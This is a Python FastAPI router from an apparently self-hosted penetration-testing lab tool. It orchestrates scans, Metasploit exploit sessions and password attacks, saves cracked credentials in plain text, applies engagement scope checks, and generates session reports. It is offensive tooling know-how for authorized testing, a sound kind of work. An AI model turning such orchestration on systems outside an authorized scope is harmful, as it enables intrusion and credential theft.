# REST endpoints for launching, caching, aborting, exporting and attacking.
import asyncio
import json
import logging
import socket
import sqlite3
import time
import uuid
from collections.abc import AsyncIterator
from contextlib import suppress
from datetime import UTC, datetime
from typing import Any

from fastapi import APIRouter, BackgroundTasks, HTTPException
from fastapi.responses import StreamingResponse
from paths import data_dir
from schemas import (
    ADBloodhoundRequest,
    ADMitm6Request,
    ADResponderRequest,
    AircrackRequest,
    AircrackResult,
    AttackRequest,
    BatchScanRequest,
    BatchScanResult,
    ContainerEscapeResult,
    ContainerFuzzRequest,
    ContainerFuzzResult,
    DBInterrogateRequest,
    DeepAttackRequest,
    FireTVRequest,
    FireTVResult,
    FuzzRequest,
    GobusterRequest,
    GobusterResult,
    Job,
    JohnRequest,
    JohnResult,
    KerberosRoastRequest,
    KerberosRoastResult,
    LateralRequest,
    NiktoRequest,
    NiktoResult,
    NmapNSERequest,
    NmapNSEResult,
    NucleiRequest,
    NucleiResult,
    PaginatedJobs,
    Report,
    ScanRequest,
    SqlmapRequest,
    SqlmapResult,
    TlsFingerprintRequest,
    TlsFingerprintResult,
    TlsInventoryRequest,
    TlsInventoryResult,
    TsharkRequest,
    TsharkResult,
    VulnLeadsRequest,
    ZapRequest,
    ZapResult,
)
from services.cve_lookup import CveDb
from services.discovery import NeighborFinder
from services.msfrpc import MsfClient
from services.report import build_report
from services.scan_pipeline import ScanPipeline, _ScanAbort

logger = logging.getLogger("h4k.routers.scan")

router = APIRouter(prefix="/api")

# In-memory job + scan-cache stores (single-lab deployment; fine for this project).
JOBS: dict[str, dict[str, Any]] = {}
_scan_cache: dict[str, dict[str, Any]] = {}
CACHE_TTL_SECONDS = 300  # re-serve a matching recent scan within 5 minutes

_neighbors_cache: dict[str, list[dict[str, Any]]] = {}
_neighbor_jobs: dict[str, dict[str, Any]] = {}
_fingerprint_jobs: dict[str, dict[str, Any]] = {}
_passattack_jobs: dict[str, dict[str, Any]] = {}
_attack_cache: dict[str, list[dict[str, Any]]] = {}

# Runtime store lives next to the bundled data on a host checkout, in
# /opt/h4k/data in the container image. The resolution lives in paths.py so
# the API, the engagement store and the tests always agree.
_RUNTIME_DATA = data_dir()
_NEIGHBOR_DB = _RUNTIME_DATA / "neighbors.db"
_NEIGHBOR_DB.parent.mkdir(parents=True, exist_ok=True)


def _neighbor_db() -> sqlite3.Connection:
    conn = sqlite3.connect(_NEIGHBOR_DB, timeout=10)
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_hosts ("
        "  ip          TEXT PRIMARY KEY,"
        "  mac         TEXT,"
        "  vendor      TEXT,"
        "  hostname    TEXT,"
        "  os_guess    TEXT,"
        "  discovered_at TEXT NOT NULL"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_services ("
        "  ip          TEXT NOT NULL,"
        "  port        INTEGER NOT NULL,"
        "  proto       TEXT NOT NULL DEFAULT 'tcp',"
        "  service     TEXT,"
        "  version     TEXT,"
        "  product     TEXT,"
        "  state       TEXT,"
        "  scanned_at  TEXT NOT NULL,"
        "  PRIMARY KEY (ip, port, proto)"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS discovered_service_vulns ("
        "  ip          TEXT NOT NULL,"
        "  port        INTEGER NOT NULL,"
        "  proto       TEXT NOT NULL DEFAULT 'tcp',"
        "  kind        TEXT NOT NULL,"  # 'cve' or 'lead'
        "  vid         TEXT NOT NULL,"  # CVE id, or lead product@version
        "  severity    REAL,"
        "  detail      TEXT,"
        "  found_at    TEXT NOT NULL,"
        "  PRIMARY KEY (ip, port, proto, kind, vid)"
        ")"
    )
    # auxiliary/post matches are recon leads, not exploitable findings
    conn.execute(
        "DELETE FROM discovered_service_vulns WHERE kind='cve' AND detail LIKE '%msf: auxiliary/%'"
    )
    conn.execute(
        "DELETE FROM discovered_service_vulns WHERE kind='cve' AND detail LIKE '%msf: post/%'"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS session_meta ("
        "  key   TEXT PRIMARY KEY,"
        "  value TEXT NOT NULL"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS exploit_sessions ("
        "  msf_session_id TEXT PRIMARY KEY,"
        "  host           TEXT NOT NULL,"
        "  port           INTEGER,"
        "  module         TEXT,"
        "  opened_at      TEXT NOT NULL"
        ")"
    )
    conn.execute(
        "CREATE TABLE IF NOT EXISTS found_creds ("
        "  host        TEXT NOT NULL,"
        "  port        INTEGER NOT NULL,"
        "  service     TEXT NOT NULL,"
        "  user        TEXT NOT NULL,"
        "  password    TEXT NOT NULL,"
        "  found_at    TEXT NOT NULL,"
        "  PRIMARY KEY (host, port, service, user, password)"
        ")"
    )
    conn.commit()
    return conn


def _save_neighbor_host(
    ip: str,
    mac: str | None,
    vendor: str | None,
    hostname: str | None,
    os_guess: str | None = None,
) -> None:
    from datetime import UTC, datetime

    if os_guess is None:
        os_guess = _vendor_to_os(vendor) if vendor else None

    conn = _neighbor_db()
    conn.execute(
        "INSERT OR REPLACE INTO discovered_hosts (ip, mac, vendor, hostname, os_guess, discovered_at) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (ip, mac, vendor, hostname, os_guess, datetime.now(UTC).isoformat()),
    )
    conn.commit()
    conn.close()
    # mirror into the active engagement's asset graph (scope-checked there)
    _eng_ingest_asset(ip, os_=os_guess, vendor=vendor)


def _save_neighbor_services(ip: str, services: list[dict[str, Any]]) -> None:
    from datetime import UTC, datetime

    conn = _neighbor_db()
    conn.execute("DELETE FROM discovered_services WHERE ip = ?", (ip,))
    now = datetime.now(UTC).isoformat()
    for svc in services:
        conn.execute(
            "INSERT OR REPLACE INTO discovered_services (ip, port, proto, service, version, product, state, scanned_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (
                ip,
                svc.get("port"),
                svc.get("proto", "tcp"),
                svc.get("service"),
                svc.get("version"),
                svc.get("product"),
                svc.get("state"),
                now,
            ),
        )
    conn.commit()
    for svc in services:
        # mirror into the active engagement's asset graph (scope-checked there)
        _eng_ingest_service(ip, svc)


def _load_neighbor_services() -> dict[str, list[dict[str, Any]]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, port, proto, service, version, product, state FROM discovered_services"
    ).fetchall()
    conn.close()
    out: dict[str, list[dict[str, Any]]] = {}
    for r in rows:
        entry = {
            "port": r[1],
            "proto": r[2],
            "service": r[3],
            "version": r[4],
            "product": r[5],
            "state": r[6],
        }
        out.setdefault(r[0], []).append(entry)
    return out


def _save_service_vulns(
    ip: str, port: int, proto: str, rows: list[dict[str, Any]]
) -> None:
    from datetime import UTC, datetime

    for v in rows:
        # mirror into the active engagement's asset graph (scope-checked there)
        _eng_ingest_vuln(ip, v)
    conn = _neighbor_db()
    now = datetime.now(UTC).isoformat()
    for v in rows:
        conn.execute(
            "INSERT OR REPLACE INTO discovered_service_vulns "
            "(ip, port, proto, kind, vid, severity, detail, found_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (
                ip,
                port,
                proto,
                v.get("kind", "cve"),
                v.get("vid", ""),
                v.get("severity"),
                v.get("detail"),
                now,
            ),
        )
    conn.commit()


def _load_neighbor_vulns() -> list[dict[str, Any]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, port, proto, kind, vid, severity, detail FROM discovered_service_vulns ORDER BY severity DESC"
    ).fetchall()
    conn.close()
    return [
        {
            "ip": r[0],
            "port": r[1],
            "proto": r[2],
            "kind": r[3],
            "vid": r[4],
            "severity": r[5],
            "detail": r[6],
        }
        for r in rows
    ]


def passattack_creds() -> dict[str, Any]:
    """All creds found by password attacks (module-level alias of the endpoint)."""
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT host, port, service, user, password, found_at FROM found_creds ORDER BY found_at DESC"
    ).fetchall()
    conn.close()
    return {
        "creds": [
            {
                "host": r[0],
                "port": r[1],
                "service": r[2],
                "user": r[3],
                "password": r[4],
            }
            for r in rows
        ],
        "count": len(rows),
    }


# ---- session lifecycle -----------------------------------------------------
# A session brackets a body of recon work: everything discovered, fingerprinted
# and correlated lives in the neighbors/graph DB until the operator resets.
# Reset is explicit (a UI button) — never automatic — because the accumulated
# picture IS the deliverable of a lab engagement.


def _new_session_id() -> str:
    return uuid.uuid4().hex[:12]


# ---- engagement scope enforcement ------------------------------------------
# Aggressive actions (password attack, exploit, web probe) must fall inside the
# active engagement's declared CIDRs. Read-only recon (ARP sweep, fingerprint)
# still runs anywhere but out-of-scope results are *not recorded*, so the
# accumulated picture can never grow outside the operator's authorization.


def _eng_active() -> tuple[str | None, Any]:
    """(engagement_id, store) — (None, None) when nothing is scoped."""
    eng_id, store = _active_scope()
    if eng_id is None or store is None:
        return None, None
    return eng_id, store


def _eng_ingest_asset(
    ip: str, os_: str | None = None, vendor: str | None = None
) -> None:
    eng_id, store = _eng_active()
    if not eng_id:
        return
    with suppress(Exception):
        store.upsert_asset(eng_id, str(ip), os=os_, vendor=vendor)


def _eng_ingest_service(ip: str, svc: dict[str, Any]) -> None:
    eng_id, store = _eng_active()
    if not eng_id:
        return
    with suppress(Exception):
        store.upsert_service(eng_id, str(ip), svc)


def _eng_ingest_vuln(ip: str, vuln: dict[str, Any]) -> None:
    eng_id, store = _eng_active()
    if not eng_id:
        return
    with suppress(Exception):
        store.record_vuln(
            eng_id,
            str(ip),
            {
                "name": vuln.get("vid") or "unknown",
                "severity": vuln.get("severity"),
                "module": (
                    (vuln.get("detail") or "").split("msf: ")[-1].split()[0]
                    if "msf: " in (vuln.get("detail") or "")
                    else None
                ),
            },
        )


def _eng_ingest_cred(cred: dict[str, Any], verified: bool = False) -> None:
    eng_id, store = _eng_active()
    if not eng_id:
        return
    with suppress(Exception):
        store.record_credential(
            eng_id,
            cred.get("user") or "",
            cred.get("password") or "",
            service=cred.get("service"),
            origin_host=cred.get("host"),
            origin_port=cred.get("port"),
            verified=verified,
        )


def _active_scope() -> tuple[str | None, Any | None]:
    """(engagement_id, store) for the active engagement, or (None, None)."""
    try:
        import app_state
    except Exception:  # pragma: no cover - tests run flat-loaded
        return None, None
    eng_id = getattr(app_state, "active_engagement_id", None)
    if not eng_id:
        # persisted choice from a previous run (survives container restarts)
        with suppress(Exception):
            conn = _neighbor_db()
            saved = dict(
                conn.execute(
                    "SELECT key, value FROM session_meta WHERE key = 'active_engagement_id'"
                ).fetchall()
            ).get("active_engagement_id")
            conn.close()
            if saved:
                eng_id = str(saved)
                app_state.active_engagement_id = eng_id
    if not eng_id:
        return None, None
    try:
        from services.engagement import EngagementStore

        store = EngagementStore()
        # stale id (engagement deleted) clears itself
        if not any(e["id"] == eng_id for e in store.list_engagements()):
            app_state.active_engagement_id = None
            return None, None
        return eng_id, store
    except Exception:
        return None, None


def _host_in_scope(ip: str) -> tuple[bool, str]:
    """(allowed, reason). No active engagement = allowed (read-only posture)."""
    eng_id, store = _active_scope()
    if eng_id is None or store is None:
        return True, ""
    if store.in_scope(eng_id, str(ip)):
        return True, ""
    return False, f"{ip} is outside the active engagement's authorized scope"


def _demand_scope(ip: str) -> None:
    ok, reason = _host_in_scope(ip)
    if not ok:
        raise HTTPException(status_code=403, detail=reason)


@router.post("/session/scope")
def set_session_scope(req: dict[str, Any]) -> dict[str, Any]:
    """Activate/deactivate the engagement whose CIDRs constrain actions."""
    import app_state

    eng_id = req.get("engagement_id")
    if eng_id:
        from services.engagement import EngagementStore

        store = EngagementStore()
        engs = store.list_engagements()
        if not any(e["id"] == eng_id for e in engs):
            raise HTTPException(status_code=404, detail="engagement not found")
        app_state.active_engagement_id = eng_id
        with suppress(Exception):
            conn = _neighbor_db()
            conn.execute(
                "INSERT OR REPLACE INTO session_meta (key, value) "
                "VALUES ('active_engagement_id', ?)",
                (eng_id,),
            )
            conn.commit()
            conn.close()
        logger.warning(
            "[scope] engaged: %s (%s) -> %s",
            next(e["name"] for e in engs if e["id"] == eng_id),
            eng_id,
            ", ".join(store.scope_of(eng_id)),
        )
        scope = store.scope_of(eng_id)
        name = next(e["name"] for e in engs if e["id"] == eng_id)
        return {
            "status": "scoped",
            "engagement_id": eng_id,
            "name": name,
            "scope": scope,
        }
    app_state.active_engagement_id = None
    # clear the persisted choice too, or a restart would silently re-arm it
    with suppress(Exception):
        conn = _neighbor_db()
        conn.execute("DELETE FROM session_meta WHERE key = 'active_engagement_id'")
        conn.commit()
        conn.close()
    logger.warning("[scope] cleared - actions unrestricted")
    return {"status": "unscoped"}


def _session_scope_info() -> dict[str, Any]:
    eng_id, store = _active_scope()
    if eng_id is None or store is None:
        return {"engagement_id": None, "name": None, "scope": []}
    cidrs = store.scope_of(eng_id)
    engs = store.list_engagements()
    name = next((e["name"] for e in engs if e["id"] == eng_id), eng_id)
    return {"engagement_id": eng_id, "name": name, "scope": cidrs}


def _ensure_session_row() -> dict[str, str]:
    from datetime import UTC, datetime

    conn = _neighbor_db()
    row = dict(conn.execute("SELECT key, value FROM session_meta").fetchall() or [])
    if "session_id" not in row:
        sid = _new_session_id()
        now = datetime.now(UTC).isoformat()
        conn.execute(
            "INSERT OR REPLACE INTO session_meta (key, value) VALUES ('session_id', ?), "
            "('started_at', ?)",
            (sid, now),
        )
        conn.commit()
        conn.close()
        return {"session_id": sid, "started_at": now}
    conn.close()
    return {"session_id": row["session_id"], "started_at": row.get("started_at", "")}


@router.get("/session")
def get_session() -> dict[str, Any]:
    """Current recon session: id, start time, asset counts, active scope."""
    meta = _ensure_session_row()
    conn = _neighbor_db()
    counts = {
        "hosts": conn.execute("SELECT COUNT(*) FROM discovered_hosts").fetchone()[0],
        "services": conn.execute("SELECT COUNT(*) FROM discovered_services").fetchone()[
            0
        ],
        "vulns": conn.execute(
            "SELECT COUNT(*) FROM discovered_service_vulns"
        ).fetchone()[0],
    }
    conn.close()
    return {**meta, **counts, "scope": _session_scope_info()}


@router.get("/session/report")
def session_report(fmt: str = "json") -> Any:
    """Full session writeup: hosts, services, vulns, creds, sessions, attacks.

    Markdown for the disclosure writeup, JSON for further processing,
    PDF for the one-click client handoff.
    """
    meta = _ensure_session_row()
    conn = _neighbor_db()

    hosts = [
        {"ip": r[0], "mac": r[1], "vendor": r[2], "hostname": r[3], "os": r[4]}
        for r in conn.execute(
            "SELECT ip, mac, vendor, hostname, os_guess FROM discovered_hosts ORDER BY ip"
        )
    ]
    svcs = conn.execute(
        "SELECT ip, port, proto, service, product, version, state FROM discovered_services ORDER BY ip, port"
    ).fetchall()
    vulns = [
        {
            "ip": r[0],
            "port": r[1],
            "proto": r[2],
            "kind": r[3],
            "vid": r[4],
            "severity": r[5],
            "detail": r[6],
        }
        for r in conn.execute(
            "SELECT ip, port, proto, kind, vid, severity, detail "
            "FROM discovered_service_vulns ORDER BY severity DESC"
        )
    ]
    creds = [
        {
            "host": r[0],
            "port": r[1],
            "service": r[2],
            "user": r[3],
            "password": r[4],
            "found_at": r[5],
        }
        for r in conn.execute(
            "SELECT host, port, service, user, password, found_at FROM found_creds ORDER BY found_at"
        )
    ]
    sessions = [
        {
            "msf_session_id": r[0],
            "host": r[1],
            "port": r[2],
            "module": r[3],
            "opened_at": r[4],
        }
        for r in conn.execute(
            "SELECT msf_session_id, host, port, module, opened_at FROM exploit_sessions ORDER BY opened_at"
        )
    ]
    attempts: list[dict[str, Any]] = []
    for job in _attack_jobs.values():
        for a in job.get("attacks", []) or []:
            attempts.append(
                {
                    "job": job.get("id"),
                    "host": a.get("host"),
                    "module": a.get("module"),
                    "result": a.get("result"),
                    "detail": (a.get("detail") or "")[:120],
                    "session_id": a.get("session_id"),
                }
            )
    conn.close()

    runs: list[dict[str, Any]] = []
    with suppress(Exception):
        conn = _neighbor_db()
        rows = conn.execute(
            "SELECT run_id, created_at, scope, message, log FROM autopilot_runs ORDER BY created_at DESC LIMIT 5"
        ).fetchall()
        conn.close()
        runs = [
            {
                "run_id": r[0],
                "created_at": r[1],
                "scope": r[2],
                "message": r[3],
                "log": r[4],
            }
            for r in rows
        ]
    with suppress(Exception):
        conn = _neighbor_db()
        recon_rows = conn.execute(
            "SELECT msf_session_id, command, output FROM session_recon ORDER BY at"
        ).fetchall()
        conn.close()
        recon_bysess: dict[str, list[dict[str, Any]]] = {}
        for r in recon_rows:
            recon_bysess.setdefault(str(r[0]), []).append(
                {"command": r[1], "output": str(r[2])[:600]}
            )

    scope = _session_scope_info()
    watch_changes: list[dict[str, Any]] = []
    handoff: list[dict[str, Any]] = []
    if scope.get("engagement_id"):
        with suppress(Exception):
            from services.engagement import EngagementStore

            watch_changes = EngagementStore().watch_changes(
                scope["engagement_id"], limit=10
            )
        with suppress(Exception):
            from services.attck import enrich_engagement
            from services.engagement import EngagementStore as _ES2

            _enr = enrich_engagement(_ES2(), scope["engagement_id"])
            handoff = [
                {"id": t.get("id"), "name": t.get("name"), "count": t.get("count", 0)}
                for t in _enr.get("techniques", [])
            ]
    report = {
        **meta,
        "scope": scope,
        "generated": datetime.now(UTC).isoformat(),
        "hosts": hosts,
        "services": [
            {
                "ip": s[0],
                "port": s[1],
                "proto": s[2],
                "service": s[3],
                "product": s[4],
                "version": s[5],
                "state": s[6],
            }
            for s in svcs
        ],
        "vulns": vulns,
        "credentials": creds,
        "sessions": [
            {**s, "recon": recon_bysess.get(str(s["msf_session_id"]), [])}
            for s in sessions
        ],
        "exploit_attempts": attempts,
        "autopilot_runs": runs,
        "watch_changes": watch_changes,
        "handoff_techniques": handoff,
    }

    scope_info: Any = report["scope"]
    service_rows: Any = report["services"]

    if fmt == "md":
        lines = [
            f"# h4k session report — {meta['session_id']}",
            f"*generated {report['generated']}*",
            "",
        ]
        if scope_info.get("engagement_id"):
            lines.append(
                f"**Scope:** {scope_info.get('name')} — {', '.join(scope_info.get('scope') or [])}"
            )
            lines.append("")
        lines.append("## Hosts discovered")
        for h in hosts:
            lines.append(
                f"- `{h['ip']}` {h['vendor'] or ''} {h['hostname'] or ''} {h['os'] or ''}".rstrip()
            )
        lines.append("")
        lines.append("## Open services")
        lines.append("| Host | Port | Service | Product | Version |")
        lines.append("|---|---|---|---|---|")
        for s in service_rows:
            lines.append(
                f"| `{s['ip']}` | {s['port']} | {s['service'] or '?'} | {s['product'] or ''} | {s['version'] or ''} |"
            )
        lines.append("")
        lines.append("## Likely vulnerable")
        for v in vulns:
            lines.append(f"- **{v['vid']}** on `{v['ip']}:{v['port']}` — {v['detail']}")
        lines.append("")
        lines.append("## Credentials verified")
        lines += [
            f"- `{c['host']}:{c['port']}` {c['service']} — {c['user']}:{c['password']}"
            for c in creds
        ] or ["- none"]
        lines.append("")
        lines.append("## Sessions opened")
        lines += [
            f"- 💀 `{s['host']}` via {s['module']} (session {s['msf_session_id']})"
            for s in sessions
        ] or ["- none"]
        lines.append("")
        lines.append("## Exploit attempts")
        lines += [
            f"- `{a['host']}` {a['module']} → {a['result']}" for a in attempts
        ] or ["- none"]
        lines.append("")
        lines.append("## Lab watch (estate changes)")
        if watch_changes:
            for ch in watch_changes:
                lines.append(f"- {ch['created_at']} [{ch['source']}] {ch['summary']}")
        else:
            lines.append("- no changes recorded yet — run a scan or wait for auto-scan")
        lines.append("")
        lines.append("## Blue-team handoff")
        if handoff:
            for t in handoff:
                lines.append(
                    f"- **{t['id']}** {t.get('name') or ''} (×{t.get('count', 0)})"
                )
            lines.append(
                f"- Navigator layer + Sigma bundle: GET /api/engagement/{scope.get('engagement_id')}/handoff/navigator|sigma"
            )
        else:
            lines.append(
                "- no techniques observed yet — scan and ingest findings first"
            )
        lines.append("")
        lines.append(
            "> Generated for authorized lab use — verify every target was owned before citing it."
        )
        return {"fmt": "md", "content": "\n".join(lines)}
    if fmt == "pdf":
        from fastapi.responses import Response
        from services.pdf_report import build_session_pdf

        try:
            pdf = build_session_pdf(report)
        except RuntimeError as exc:
            raise HTTPException(status_code=500, detail=str(exc)) from exc
        return Response(
            content=pdf,
            media_type="application/pdf",
            headers={"Content-Disposition": "attachment; filename=h4k-session.pdf"},
        )
    return {"fmt": "json", "report": report}


@router.post("/session/reset")
def reset_session(wipe_engagements: bool = False) -> dict[str, Any]:
    """Start a fresh session: wipe discovered hosts/services/vulns, job history
    and caches. Optionally also delete persistent engagements (default: keep).
    """
    from datetime import UTC, datetime

    sid = _ensure_session_row()["session_id"]

    conn = _neighbor_db()
    for table in (
        "discovered_services",
        "discovered_service_vulns",
        "discovered_hosts",
        "found_creds",
        "exploit_sessions",
        "session_recon",
        "autopilot_runs",
    ):
        conn.execute(f"DROP TABLE IF EXISTS {table}")
    new_id = _new_session_id()
    conn.execute(
        "INSERT OR REPLACE INTO session_meta (key, value) VALUES ('session_id', ?), "
        "('started_at', ?)",
        (new_id, datetime.now(UTC).isoformat()),
    )
    # a new session starts unscoped: authorization is per-engagement
    conn.execute("DELETE FROM session_meta WHERE key = 'active_engagement_id'")
    try:
        import app_state

        app_state.active_engagement_id = None
    except Exception:
        pass
    conn.commit()
    conn.close()

    _neighbors_cache.clear()
    _neighbor_jobs.clear()
    _fingerprint_jobs.clear()
    JOBS.clear()
    _scan_cache.clear()
    _attack_cache.clear()
    _attack_jobs.clear()
    _toolkit_jobs.clear()
    _fuzz_jobs.clear()

    engagements_deleted = 0
    if wipe_engagements:
        try:
            from services.engagement import EngagementStore

            store = EngagementStore()
            for eng in store.list_engagements():
                if store.delete_engagement(eng["id"]):
                    engagements_deleted += 1
        except Exception as exc:
            logger.warning("engagement wipe failed: %s", exc)

    logger.info(
        "session reset: %s -> %s (engagements wiped: %d)",
        sid,
        new_id,
        engagements_deleted,
    )
    return {
        "status": "reset",
        "previous_session_id": sid,
        "session_id": new_id,
        "engagements_deleted": engagements_deleted,
    }


def _load_neighbor_hosts() -> dict[str, dict[str, Any]]:
    conn = _neighbor_db()
    rows = conn.execute(
        "SELECT ip, mac, vendor, hostname, os_guess FROM discovered_hosts"
    ).fetchall()
    conn.close()
    return {
        r[0]: {"ip": r[0], "mac": r[1], "vendor": r[2], "hostname": r[3], "os": r[4]}
        for r in rows
    }


_attack_jobs: dict[str, dict[str, Any]] = {}


def _get_msf() -> MsfClient | None:
    from app_state import msf_client

    return msf_client


def _get_cve_db() -> CveDb | None:
    with suppress(Exception):
        from app_state import cve_db

        return cve_db
    return None


def _cache_key(req: ScanRequest) -> str:
    # depth MUST be part of the key: a cached top-1000 result must never be
    # served to a caller who asked for a full 1-65535 sweep.
    depth = getattr(req, "depth", None)
    return (
        f"{req.mode.value}::{req.target}::"
        f"depth={depth.value if depth else 'standard'}::"
        f"creds={int(req.try_default_creds)}::"
        f"attack={int(req.do_attack)}"
    )


def _pull_cached(req: ScanRequest) -> dict[str, Any] | None:
    key = _cache_key(req)
    entry = _scan_cache.get(key)
    if not entry:
        return None
    created = entry.get("created")
    if created and (time.time() - created) < CACHE_TTL_SECONDS:
        return entry
    _scan_cache.pop(key, None)
    return None


def _run_scan(job: dict[str, Any], req: ScanRequest) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="scan starting")
    msf = _get_msf()
    if msf is None:
        _update(
            job,
            status="error",
            error="msfrpcd client unavailable",
            message="scan failed",
        )
        return
    report_model: Report | None = None  # noqa: F841

    def _log(msg: str) -> None:
        job.setdefault("log", []).append(msg)
        _update(job, log=job["log"])

    def _stop() -> bool:
        return job.get("status") == "abort_requested"

    pipeline = ScanPipeline(
        msf,
        progress=lambda msg, pct: _update(job, message=msg, progress=pct),
        log=_log,
        should_stop=_stop,
    )
    try:
        raw = pipeline.run(req)
        report = build_report(
            target=req.target,
            mode=req.mode.value,
            hosts=raw.get("hosts", []),
            vulns=raw.get("vulns", []),
            notes=raw.get("notes", []),
            cve_db=_get_cve_db(),
            fingerprints=raw.get("fingerprints", []),
            credentials=raw.get("credentials", []),
            attacks=raw.get("attacks", []),
            security=raw.get("security", []),
            log=job.get("log", []),
            coverage=raw.get("coverage"),
        )
        _scan_cache[_cache_key(req)] = {
            "created": time.time(),
            "report": report.model_dump(),
        }
        # remember verified creds for later opt-in attacks on this target
        _attack_cache[req.target] = raw.get("credentials", [])
        _update(
            job, status="done", progress=100.0, report=report, message="scan complete"
        )
    except _ScanAbort:
        _log("scan aborted")
        _update(
            job, status="aborted", message="scan aborted by operator", progress=100.0
        )
    except Exception as exc:
        logger.exception("scan failed")
        _update(job, status="error", error=str(exc), message="scan failed")


def _update(job: dict[str, Any], **kwargs: Any) -> None:
    old_status = job.get("status")
    job.update(kwargs)
    job["updated"] = datetime.now(UTC).isoformat()
    new_status = job.get("status")
    if "status" in kwargs and new_status != old_status:
        logger.info(
            "[job %s] %s: %s -> %s (%s)",
            job.get("id"),
            job.get("kind", "job"),
            old_status,
            new_status,
            str(job.get("message") or "")[:120],
        )


@router.post("/scan", response_model=Job)
def create_scan(req: ScanRequest, background: BackgroundTasks) -> Job:
    # Serve from cache if we scanned the same target+mode recently.
    cached = _pull_cached(req)
    if cached:
        report = Report(**cached["report"])
        cached_job: dict[str, Any] = {
            "id": uuid.uuid4().hex[:12],
            "target": req.target,
            "status": "done",
            "progress": 100.0,
            "message": "served from cache",
            "report": report,
            "error": None,
            "cached": True,
            "created": datetime.now(UTC).isoformat(),
            "log": ["served from recent scan cache"],
        }
        JOBS[cached_job["id"]] = cached_job
        return Job(**cached_job)

    job: dict[str, Any] = {
        "id": uuid.uuid4().hex[:12],
        # the monitor lists jobs by target, and the report is null until the
        # run finishes, so the target has to live on the job itself
        "target": req.target,
        "status": "queued",
        "progress": 0.0,
        "message": "queued",
        "report": None,
        "error": None,
        "cached": False,
        "created": datetime.now(UTC).isoformat(),
        "log": [],
    }
    job_id = job["id"]
    JOBS[job_id] = job
    background.add_task(_run_scan, job, req)
    logger.info("scan job %s started for %s (%s)", job_id, req.target, req.mode)
    return Job(**job)


@router.post("/scan/batch", response_model=BatchScanResult)
def batch_scan(req: BatchScanRequest, background: BackgroundTasks) -> BatchScanResult:
    """Launch scans against up to 50 targets in a single call.

    Each target gets its own job. Jobs are tracked independently and can be
    monitored via GET /api/jobs or GET /api/jobs/{id}/stream.
    """
    if len(req.targets) > 50:
        raise HTTPException(status_code=422, detail="max 50 targets per batch")
    if not req.targets:
        raise HTTPException(status_code=422, detail="at least one target required")

    import uuid as uuid_mod

    jobs: list[Job] = []
    for target in req.targets:
        job = {
            "id": uuid_mod.uuid4().hex[:12],
            "target": target,
            "status": "queued",
            "progress": 0.0,
            "message": "queued",
            "report": None,
            "error": None,
            "cached": False,
            "created": datetime.now(UTC).isoformat(),
            "log": [],
        }
        JOBS[job["id"]] = job
        req_for_target = ScanRequest(
            target=target,
            mode=req.mode,
            depth=req.depth,
            do_dns_recon=req.do_dns_recon,
            do_vuln_scan=req.do_vuln_scan,
            try_default_creds=req.try_default_creds,
            open_sessions=req.open_sessions,
            do_attack=req.do_attack,
        )
        background.add_task(_run_scan, job, req_for_target)
        jobs.append(Job(**job))

    batch_id = uuid_mod.uuid4().hex[:12]
    logger.info("batch scan %s launched with %d targets", batch_id, len(jobs))
    return BatchScanResult(
        batch_id=batch_id,
        jobs=jobs,
        launched=len(jobs),
        message=f"Launched {len(jobs)} scans. Monitor at GET /api/jobs",
    )


@router.post("/scan/{job_id}/abort", response_model=Job)
def abort_scan(job_id: str) -> Job:
    job = JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="job not found")
    if job.get("status") in ("done", "error", "aborted"):
        return Job(**job)
    job["status"] = "abort_requested"
    job.setdefault("log", []).append("abort requested by operator")
    _update(job)
    return Job(**job)


# statuses that mean "still in flight" — everything else is terminal.
ACTIVE_STATUSES = ("queued", "running", "abort_requested")


def _job_summary(kind: str, job: dict[str, Any]) -> dict[str, Any]:
    """Normalize one job from any store into the monitor's common shape.

    `progress` stays None for job families that never report a percentage: a
    hydra run has no meaningful percentage and showing 0% would read as
    "stalled" when it is actually working.
    """
    raw_progress = job.get("progress")
    return {
        "id": job.get("id"),
        "type": kind,
        "target": job.get("target") or job.get("host"),
        "status": job.get("status", "unknown"),
        "progress": float(raw_progress) if raw_progress is not None else None,
        "message": job.get("message") or "",
        "created": job.get("created"),
        "updated": job.get("updated"),
    }


def _all_jobs(active_only: bool = False) -> list[dict[str, Any]]:
    """Merge every job store, newest first.

    Without this the UI can only rediscover a job from an id it happens to be
    holding in a browser variable, so anything started elsewhere (another tab,
    before a reload, curl) is invisible while it is still running.
    """
    out: list[dict[str, Any]] = []
    # One dict per family because the shapes differ (scan has progress+report,
    # deepattack has per-tool results). Resolved lazily: the toolkit/fuzz stores
    # are declared further down this module.
    stores = (
        ("scan", JOBS),
        ("attack", _attack_jobs),
        ("deepattack", _toolkit_jobs),
        ("fuzz", _fuzz_jobs),
        ("neighbors", _neighbor_jobs),
        ("fingerprint", _fingerprint_jobs),
        ("passattack", _passattack_jobs),
        ("container_fuzz", _cfuzz_jobs),
    )
    for kind, store in stores:
        for job in store.values():
            if active_only and job.get("status") not in ACTIVE_STATUSES:
                continue
            out.append(_job_summary(kind, job))
    out.sort(key=lambda j: j.get("created") or "", reverse=True)
    return out


@router.get("/jobs", response_model=PaginatedJobs)
def list_jobs(
    active: bool = False,
    page: int = 1,
    per_page: int = 20,
    limit: int = 100,
) -> PaginatedJobs:
    """Enumerate every job family (scan / attack / deepattack / fuzz /
    neighbors / fingerprint / passattack).

    Supports cursor-free pagination via `page` + `per_page`. Also accepts the
    legacy `limit` param for backward compatibility (returns first `limit` items).
    """
    everything = _all_jobs()
    jobs = (
        [j for j in everything if j["status"] in ACTIVE_STATUSES]
        if active
        else everything
    )

    # Backward compat: if limit < per_page * 2, use legacy slice behaviour
    if limit < per_page * 2:
        return PaginatedJobs(
            jobs=[Job(**j) for j in jobs[:limit]],
            total=len(everything),
            active=sum(1 for j in everything if j["status"] in ACTIVE_STATUSES),
            page=1,
            per_page=limit,
            pages=1,
        )

